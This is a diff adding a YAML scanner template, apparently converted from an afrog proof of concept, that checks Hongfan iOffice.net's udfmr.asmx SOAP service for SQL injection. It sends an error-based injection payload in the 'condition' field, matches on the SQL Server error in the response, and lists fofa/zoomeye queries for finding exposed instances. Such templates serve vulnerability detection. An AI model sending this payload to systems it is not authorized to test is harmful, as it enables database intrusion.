@@ -1,0 +1,47 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - body: |
+      <?xml version="1.0" encoding="utf-8"?>
+      <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+        <soap:Body>
+          <GetEmpSearch xmlns="http://tempuri.org/ioffice/udfmr">
+            <condition>1=db_name(1)</condition>
+          </GetEmpSearch>
+        </soap:Body>
+      </soap:Envelope>
+    headers:
+      Content-Type: text/xml; charset=utf-8
+      SOAPAction: http://tempuri.org/ioffice/udfmr/GetEmpSearch
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - '''master'''
+          - 'System.Data.SqlClient.SqlException:'
+        condition: and
+      - type: word
+        part: header
+        words:
+          - text/xml
+        condition: and
+    method: POST
+    path:
+      - '{{BaseURL}}/iOffice/prg/set/wss/udfmr.asmx'
+id: ioffice-oa-udfmr-asmx-sql-inject
+info:
+  author: zan8in
+  description: |-
+    红帆iOffice.net udfmr.asmx处存在SQL注入漏洞，攻击者可以从其中获取数据库权限。
+    fofa: app="红帆-ioffice"
+    zoomeye: app:"红帆 ioffice"
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: 红帆OA udfmr.asmx SQL注入漏洞
+  severity: high
+  tags: ioffice,hongfan,sqlinject,argus-import
